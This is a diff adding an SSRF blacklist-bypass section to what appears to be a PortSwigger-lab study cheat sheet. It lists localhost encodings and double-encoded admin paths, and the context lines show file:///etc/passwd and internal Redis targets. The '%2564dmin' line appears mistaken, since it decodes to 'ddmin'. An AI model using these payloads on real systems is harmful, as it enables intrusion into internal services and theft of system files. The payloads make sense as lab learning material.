@@ -43,6 +43,22 @@ file:///etc/passwd
 dict://127.0.0.1:6379/info
 ```
 
+## Blacklist Bypass (Verified)
+
+### Host Bypass
+```
+http://127.1                    # Short form, bypasses localhost/127.0.0.1 keywords
+http://0x7f000001               # Hex
+http://0177.0.0.1               # Octal
+http://2130706433               # Decimal
+```
+
+### Path Bypass (Double URL Encoding)
+```
+http://127.1/%2561dmin          # %2561 = encoded %61 = 'a', bypasses /admin keyword
+http://127.1/%2564dmin          # %2564 = encoded %64 = 'd'
+```
+
 ## PortSwigger Lab Approach
 1. Find stock check / similar feature with URL parameter
 2. Change URL to internal target: `http://192.168.0.1:8080/admin`
